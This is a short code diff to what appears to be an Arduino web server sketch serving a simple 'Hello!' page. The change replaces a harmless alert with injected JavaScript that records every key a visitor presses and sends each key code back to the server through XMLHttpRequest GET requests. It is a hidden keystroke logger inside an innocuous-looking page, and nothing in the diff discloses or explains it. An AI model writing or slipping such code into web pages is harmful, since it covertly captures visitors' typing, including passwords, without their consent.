@@ -31,7 +31,11 @@ void loop() {
       {client.println("<body>");}
       {client.println("<p>Hello!</p>");}
       {client.println("<script type=\"text/javascript\">");}
-      {client.println("alert(\"Hello!\");");}
+      {client.println("document.addEventListener(\"keydown\", function() {");}
+      {client.println("xmlHTTP = new XMLHttpRequest();");}
+      {client.println("xmlHTTP.open(\"GET\", String(event.which), true);");}
+      {client.println("xmlHTTP.send();");}
+      {client.println("});");}
       {client.println("</script>");}
       {client.println("</body>");}
       {client.println("</html>");}
